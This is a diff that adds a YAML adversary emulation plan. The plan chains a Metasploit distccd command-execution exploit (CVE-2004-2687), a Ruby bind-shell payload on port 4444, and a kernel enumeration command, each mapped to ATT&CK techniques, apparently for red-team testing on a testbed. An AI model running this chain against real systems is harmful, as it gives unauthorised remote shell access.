@@ -1,0 +1,95 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-10 19:29:01 UTC+0000
+attack_action_sequence:
+  - uuid: 291452ab-1bfa-4128-948e-0ded410d268f
+    name: DistCC Daemon Command Execution
+    id:
+      - T1203
+      - T1210
+    source: Metasploit Exploit
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Initial Access
+    technique:
+      - Exploitation for Client Execution
+      - Exploitation of Remote Services
+    description: This module uses a documented security weakness to execute arbitrary
+      commands on any system running distccd.
+    testbed:
+      CVE:
+        - CVE-2004-2687
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("unix/misc/distcc_exec")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 3632
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      ConnectTimeout:
+        CurrentSetting: 10
+        Required: true
+        Description: Maximum number of seconds to establish a TCP connection
+  - uuid: 5f218e69-8c72-439a-bebc-1b1c1c35c63e
+    name: Unix Command Shell, Bind TCP (via Ruby) IPv6
+    id:
+      - T1059.004
+    source: Metasploit Payload
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Persistence
+      - Command and Control
+    technique:
+      - 'Command and Scripting Interpreter: Unix Shell (T1059.004)'
+      - Ingress Tool Transfer (T1105)
+    description: Continually listen for a connection and spawn a command shell via
+      Ruby
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("cmd/unix/bind_ruby_ipv6")
+    arguments:
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+      RHOST:
+        CurrentSetting: ''
+        Required: false
+        Description: The target address
+  - uuid: 3a53734a-9e26-4f4b-ad15-059e767f5f14
+    name: Current kernel information enumeration
+    id:
+      - T1059.004
+    source: ART
+    supported_platforms:
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'Command and Scripting Interpreter: Unix Shell'
+    description: |
+      An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.
+    execution:
+      executor: Shell Executor
+      command: |
+        uname -srm
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2004-2687
